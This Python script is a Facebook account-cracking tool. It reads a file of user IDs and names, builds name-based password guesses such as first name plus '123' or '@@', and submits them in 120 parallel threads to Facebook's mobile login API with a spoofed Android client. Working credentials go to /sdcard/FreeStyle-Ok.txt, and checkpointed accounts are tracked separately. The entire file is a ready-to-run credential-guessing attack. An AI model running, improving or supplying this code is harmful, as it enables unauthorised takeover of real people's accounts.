
import os, random, sys, json, uuid, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests")
    import requests

li="\033[1;37m—"

cox=str(f"{li}"*37)
logo=""""""
def logox():
    os.system('clear')
    print(logo)

def main():
    logox()
    print("  [A] FILE CLONE  |  [B] EXIT TOOL")
    print(cox)
    want=input("  [✓] INPUT+>")
    if want in ["A","a","1","01"]:
        file_iclone()
    elif want in ["B","b","2","02"]:
        print(cox)
        print("  [✓] Thanks For using My tool")
        print(cox)
        sys.exit()
    else:
        print(cox)
        print("  [✓] Input right option")
        print(cox)
        time.sleep(3)
        main()

def file_iclone():
    print(cox)
    fl=input("  [✓]\033[38;5;46m File Path:")
    print(cox)
    try:
        fileeee=open(fl,"r").read().splitlines()
    except:
        print("  [✓] \033[38;5;46mFile Does not found")
        print(cox)
        sys.exit()
    auto_pass(fileeee)



def auto_pass(fileeee):
    tl=str(len(fileeee))
    print("  [✓] Total id in File : "+tl)
    print(cox)
    print("  [✓] Id Save: /sdcard/FreeStyle.txt")
    print(cox)
    with ThreadPool (max_workers=120) as feel:
        for data in fileeee:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append('57273200')
            pwx.append('59039200')
            Nam=data.split("|")[1]
            name=Nam.lower()
            try:
                Fast=Nam.split(" ")[0]
                if len(Fast) >5:
                    pwx.append(Fast)
                    pwx.append(Fast.lower())
                else:pass
                
                if len(Fast) >4:
                    pwx.append(Fast+"@")
                    pwx.append(Fast+"#")
                    pwx.append(Fast+"$")
                    pwx.append(Fast+"&")
                    pwx.append(Fast.lower())
                    pwx.append(Fast.lower()+"@")
                    pwx.append(Fast.lower()+"#")
                    pwx.append(Fast.lower()+"$")
                    pwx.append(Fast.lower()+"&")
                else:pass
                
                if len(Fast) >3:
                    pwx.append(Fast.lower()+"@@")
                    pwx.append(Fast.lower()+"@#")
                    pwx.append(Fast.lower()+"##")
                    pwx.append(Fast.lower()+"$$")
                    pwx.append(Fast.lower()+"&&")
                    pwx.append(Fast.lower()+"12")
                    
                    pwx.append(Fast+"@@")
                    pwx.append(Fast+"@#")
                    pwx.append(Fast+"##")
                    pwx.append(Fast+"$$")
                    pwx.append(Fast+"&&")
                    pwx.append(Fast+"12")
                else:pass
                
                
                if len(Fast) >2:
                    pwx.append(Fast.lower()+"123")
                    pwx.append(Fast.lower()+"143")
                    pwx.append(Fast.lower()+"404")
                    pwx.append(Fast.lower()+"999")
                    pwx.append(Fast.lower()+"321")
                    pwx.append(Fast.lower()+"@@@")
                    pwx.append(Fast.lower()+"@#@")
                    pwx.append(Fast.lower()+"###")
                    
                    
                    pwx.append(Fast+"123")
                    pwx.append(Fast+"143")
                    pwx.append(Fast+"404")
                    pwx.append(Fast+"999")
                    pwx.append(Fast+"321")
                    pwx.append(Fast+"@@@")
                    pwx.append(Fast+"@#@")
                    pwx.append(Fast+"###")
                else:pass
                
                if len(Fast) >1:
                    pwx.append(Fast.lower()+"@123")
                    pwx.append(Fast.lower()+" 123")
                    pwx.append(Fast.lower()+"1234")
                    pwx.append(Fast.lower()+"12345")
                    pwx.append(Fast.lower()+"@@@@")
                    pwx.append(Fast.lower()+"@#@#")
                    pwx.append(Fast.lower()+"####")
                    pwx.append(Fast.lower()+"1122")
                    
                    pwx.append(Fast+"@123")
                    pwx.append(Fast+" 123")
                    pwx.append(Fast+"1234")
                    pwx.append(Fast+"12345")
                    pwx.append(Fast+"@@@@")
                    pwx.append(Fast+"@#@#")
                    pwx.append(Fast+"####")
                    pwx.append(Fast+"1122")
                else:pass
            except:pass
            
            
            try:
                Last=Nam.split(" ")[1]
                if len(Last) >5:
                    pwx.append(Last.lower())
                    pwx.append(Last)
                else:pass
                
                if len(Last) >4:
                    pwx.append(Last.lower()+"@")
                    pwx.append(Last.lower()+"#")
                    pwx.append(Last.lower()+"$")
                    pwx.append(Last.lower()+"&")
                    
                    pwx.append(Last+"@")
                    pwx.append(Last+"#")
                    pwx.append(Last+"$")
                    pwx.append(Last+"&")
                else:pass
                
                if len(Last) >3:
                    pwx.append(Last.lower()+"12")
                    pwx.append(Last.lower()+"@@")
                    pwx.append(Last.lower()+"@#")
                    pwx.append(Last.lower()+"##")
                    pwx.append(Last.lower()+"$$")
                    pwx.append(Last.lower()+"&&")
                    pwx.append(Last+"12")
                    pwx.append(Last+"@@")
                    pwx.append(Last+"@#")
                    pwx.append(Last+"##")
                    pwx.append(Last+"$$")
                    pwx.append(Last+"&&")
                else:pass
                
                if len(Last) >2:
                    pwx.append(Last.lower()+"123")
                    pwx.append(Last.lower()+"404")
                    pwx.append(Last.lower()+"143")
                    pwx.append(Last.lower()+"999")
                    pwx.append(Last.lower()+"@@@")
                    pwx.append(Last.lower()+"@#@")
                    pwx.append(Last.lower()+"###") 
                    pwx.append(Last+"123")
                    pwx.append(Last+"404")
                    pwx.append(Last+"143")
                    pwx.append(Last+"999")
                    pwx.append(Last+"@@@")
                    pwx.append(Last+"@#@")
                    pwx.append(Last+"###") 
                else:pass
                
                if len(Last) >1:
                    pwx.append(Last.lower()+"1122")
                    pwx.append(Last+"1122")
                    pwx.append(Last.lower()+"1234")
                    pwx.append(Last.lower()+"12345")
                    pwx.append(Last+"1234")
                    pwx.append(Last+"12345")
                    
                    
                    pwx.append(Fast.lower()+Last.lower())
                    pwx.append(Fast.lower()+Last.lower()+"123")
                    pwx.append(Fast.lower()+Last.lower()+"1234")
                    pwx.append(Fast.lower()+Last.lower()+"12345")
                    pwx.append(Fast.lower()+Last.lower()+"@#")
                    pwx.append(Fast.lower()+Last.lower()+"@@")
                    pwx.append(Fast.lower()+Last.lower()+"##")
                    
                    pwx.append(Fast+Last)
                    pwx.append(Fast+Last+"123")
                    pwx.append(Fast+Last+"1234")
                    pwx.append(Fast+Last+"12345")
                    pwx.append(Fast+Last+"@#")
                    pwx.append(Fast+Last+"@@")
                    pwx.append(Fast+Last+"##")
                    
                    
                    pwx.append(Fast.lower()+" "+Last.lower())
                    pwx.append(Fast.lower()+" "+Last.lower()+"123")
                    pwx.append(Fast.lower()+" "+Last.lower()+"1234")
                    pwx.append(Fast.lower()+" "+Last.lower()+"12345")
                    pwx.append(Fast.lower()+" "+Last.lower()+"@#")
                    pwx.append(Fast.lower()+" "+Last.lower()+"@@")
                    pwx.append(Fast.lower()+" "+Last.lower()+"##")
                    
                    
                    pwx.append(Fast+" "+Last)
                    pwx.append(Fast+" "+Last+"123")
                    pwx.append(Fast+" "+Last+"1234")
                    pwx.append(Fast+" "+Last+"12345")
                    pwx.append(Fast+" "+Last+"@#")
                    pwx.append(Fast+" "+Last+"@@")
                    pwx.append(Fast+" "+Last+"##")
                    
                else:pass
            except:pass
                
                
                
                
                
                    
                    
                
                
                
                
                
                
                
            feel.submit(file_subb,uid,pwx)
loop=0
oks=[]
cps=[]

def live_ck(uid):
    Heron=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
    data=str(Heron)
    if "live" == data.lower():
        return "Alive"
    else:
        return "death"


def file_subb(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[XD] {loop}|{str(len(oks))}");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                if "Alive" == live_ck(uid):
                    print(f"\r\r  [OK] {uid} | {ps}      ")
                    open("/sdcard/FreeStyle-Ok.txt","a").write(uid+"|"+ps+"\n")
                    oks.append(uid)
                    break
                else:pass
            elif "Please Confirm Email" in q:
                if "Alive" == live_ck(uid):
                    print(f"\r\r  [OK] {uid} | {ps}      ")
                    open("/sdcard/FreeStyle-Ok.txt","a").write(uid+"|"+ps+"\n")
                    oks.append(uid)
                    break
                else:pass
            elif "www.facebook.com" in q:
                print(f"\r\r  [CP] {uid} | {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)

main()